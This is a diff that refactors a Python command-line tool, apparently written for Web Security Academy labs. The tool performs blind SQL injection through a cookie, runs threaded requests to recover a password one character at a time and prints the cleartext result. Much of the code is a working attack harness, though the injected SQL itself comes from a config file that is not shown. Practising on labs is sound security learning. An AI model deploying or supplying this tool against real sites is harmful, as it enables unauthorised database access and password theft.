@@ -6,6 +6,7 @@ import json
 import sys
 from collections import OrderedDict
 from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
 from queue import Queue
 
 import click
@@ -19,7 +20,6 @@ from SQLInjector.brute_forcer import BruteForcer
 from SQLInjector.cookie_injector_core import CookieInjector
 
 c = Console()
-
 # url = "https://0a6c002f031d991d81c225db00ea0044.web-security-academy.net/product?productId=13"
 #
 # code_to_inject = ("""
@@ -33,7 +33,6 @@ c = Console()
 
 # threads = 20
 # queues = [Queue() for queue in range(threads)]
-futures = []
 
 
 class Injector:
@@ -47,7 +46,6 @@ class Injector:
         self.inject_code = inject_code
         self.max_threads = max_threads
         self.queues = [Queue() for queue in range(self.max_threads)]
-        self.futures = []
         self.found_characters = {}
         self.discard_seq_num = []
         self.debug_skipped = []
@@ -99,59 +97,121 @@ class Injector:
             pass
 
 
-def load_config(config_file_path):
-    try:
+class StartInjector:
+    def __init__(self):
+        self.futures = []
+
+    def load_config(self, config_file_path: Path) -> dict:
+        try:
+            with open(config_file_path, "r") as config_file:
+                return json.load(config_file)
+        except FileNotFoundError:
+            self.run_cookie_injector_setup()
+            with open(config_file_path, "r") as config_file:
+                return json.load(config_file)
+
+    def initialize_data(self, config):
+        target_url = config.get("target_url")
+        confirm_string = config.get("confirm_string").encode()
+        cookie_name = config.get("cookie_name")
+        passwd_length = int(config.get("passwd_length"))
+        char_set = config.get("char_set")
+        inject_code = config.get("inject_code")
+        max_threads = int(config.get("max_threads"))
+        return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
+
+    def print_config_file(self, config_file_path):
         with open(config_file_path, "r") as config_file:
-            return json.load(config_file)
-    except FileNotFoundError:
+            config_file_content = json.loads(config_file.read())
+        print()
+        c.print(config_file_content)
+
+    def run_cookie_injector_setup(self):
         from SQLInjector import cookie_injector_setup
         cookie_injector_setup.main()
-        with open(config_file_path, "r") as config_file:
-            return json.load(config_file)
+
+    def thread_pool_executor(self, max_threads, injector, passwd_length, start_time):
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            for thread_id, working_queue in enumerate(injector.queues):
+                while not working_queue.empty():
+                    if len(injector.discard_seq_num) != passwd_length:
+                        payload = working_queue.get()
+                        future = executor.submit(
+                            injector.cookie_injector,
+                            payload.inject_code,
+                            payload.sequence_num,
+                            payload.character,
+                            start_time
+                        )
+                        self.futures.append(future)
+                    else:
+                        break
+
+    def process_passwd_data(self, injector_obj, start_time, out_file):
+        found_characters = injector_obj.found_characters
+        ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
+        clear_text_passwd = ""
+        for k, v in ordered_passwd_dict.items():
+            clear_text_passwd += str(v)
+        end_time = datetime.datetime.now()
+        run_time = end_time - start_time
+        if len(clear_text_passwd) >= 1:
+            message = f"Password successfully brute forced: {clear_text_passwd}"
+            c.print(message, style="green")
+            if out_file:
+                with open(out_file, "w") as output_file:
+                    output_file.write(message)
+                c.print(f"Output file '{out_file}' created successfully.")
+        else:
+            message = f"No password recovered."
+            c.print(message, style="red")
+            if out_file:
+                with open(out_file, "w") as output_file:
+                    output_file.write(message)
+                c.print(f"Output file '{out_file}' created successfully.")
+        c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")
+
+    def process_options(self, set_url, config_file_path, setup_utility):
+        if setup_utility:
+            self.run_cookie_injector_setup()
+        config = self.load_config(config_file_path)
+        (
+            target_url, confirm_string, cookie_name,
+            passwd_length, char_set, inject_code,
+            max_threads
+        ) = self.initialize_data(
+            config)
+        if set_url:
+            target_url = set_url
+            c.print(f"Target URL: {target_url}")
+        return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
+
+    def kill_all_threads(self):
+        for future in self.futures:
+            future.cancel()
+        self.futures = []
+
+    def start_threads(self, set_url, config_file_path, out_file, setup_utility):
+        try:
+            target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = (
+                self.process_options(set_url, config_file_path, setup_utility)
+            )
+            self.print_config_file(config_file_path)
+            injector = Injector(
+                target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
+            )
+            start_time = datetime.datetime.now()
+            c.print(f"Start time {start_time}.", style="blue")
+            injector.check_url()
+            injector.brute_forcer()
+            c.print(Markdown("# Brute forcing password.."))
+            self.thread_pool_executor(max_threads, injector, passwd_length, start_time)
+            self.process_passwd_data(injector, start_time, out_file)
+        except KeyboardInterrupt:
+            self.kill_all_threads()
+            sys.exit("\n\nExiting, please wait.\n\nBye.\n")
 
 
-def initialize_data(config):
-    target_url = config.get("target_url")
-    confirm_string = config.get("confirm_string").encode()
-    cookie_name = config.get("cookie_name")
-    passwd_length = int(config.get("passwd_length"))
-    char_set = config.get("char_set")
-    inject_code = config.get("inject_code")
-    max_threads = int(config.get("max_threads"))
-    return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
-
-
-def print_config_file(config_file_path):
-    with open(config_file_path, "r") as config_file:
-        config_file_content = json.loads(config_file.read())
-    print()
-    c.print(config_file_content)
-
-
-def run_cookie_injector_setup():
-    from SQLInjector import cookie_injector_setup
-    cookie_injector_setup.main()
-
-
-def thread_pool_executor(max_threads, injector, passwd_length, start_time):
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        for thread_id, working_queue in enumerate(injector.queues):
-            while not working_queue.empty():
-                if len(injector.discard_seq_num) != passwd_length:
-                    payload = working_queue.get()
-                    future = executor.submit(
-                        injector.cookie_injector,
-                        payload.inject_code,
-                        payload.sequence_num,
-                        payload.character,
-                        start_time
-                    )
-                    futures.append(future)
-                else:
-                    break
-
-
-# Add option to run setup and to change url
 @click.command(
     help="This app injects a cookie, sends the crafted request, "
          "and checks the response from the page content.\n"
@@ -189,63 +249,9 @@ def thread_pool_executor(max_threads, injector, passwd_length, start_time):
     type=click.Path(exists=False),
     required=False
 )
-def start_threads(set_url, config_file_path, out_file, setup_utility):
-    try:
-        if setup_utility:
-            run_cookie_injector_setup()
-        config = load_config(config_file_path)
-        target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = initialize_data(
-            config)
-        if set_url:
-            target_url = set_url
-            c.print(f"Target URL: {target_url}")
-        injector = Injector(target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads)
-        start_time = datetime.datetime.now()
-        c.print(f"Start time {start_time}.", style="blue")
-        injector.check_url()
-        injector.brute_forcer()
-        print_config_file(config_file_path)
-        c.print(Markdown("# Brute forcing password.."))
-        thread_pool_executor(max_threads, injector, passwd_length, start_time)
-        process_passwd_data(injector, start_time, out_file)
-    except KeyboardInterrupt:
-        for future in futures:
-            future.cancel()
-        sys.exit("\n\nExiting, please wait.\n\nBye.\n")
-
-
-def process_passwd_data(injector_obj, start_time, out_file):
-    found_characters = injector_obj.found_characters
-    ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
-    clear_text_passwd = ""
-    for k, v in ordered_passwd_dict.items():
-        clear_text_passwd += str(v)
-    end_time = datetime.datetime.now()
-    run_time = end_time - start_time
-    if len(clear_text_passwd) >= 1:
-        message = f"Password successfully brute forced: {clear_text_passwd}"
-        c.print(message, style="green")
-        if out_file:
-            with open(out_file, "w") as output_file:
-                output_file.write(message)
-            c.print(f"Output file '{out_file}' created successfully.")
-    else:
-        message = f"No password recovered."
-        c.print(message, style="red")
-        if out_file:
-            with open(out_file, "w") as output_file:
-                output_file.write(message)
-            c.print(f"Output file '{out_file}' created successfully.")
-    c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")
-
-
-def main():
-    try:
-        start_threads()
-    except KeyboardInterrupt:
-        for f in futures:
-            f.cancel()
-        sys.exit("\nBye.")
+def main(set_url, config_file_path, out_file, setup_utility):
+    injector_starter = StartInjector()
+    injector_starter.start_threads(set_url, config_file_path, out_file, setup_utility)
 
 
 if __name__ == '__main__':
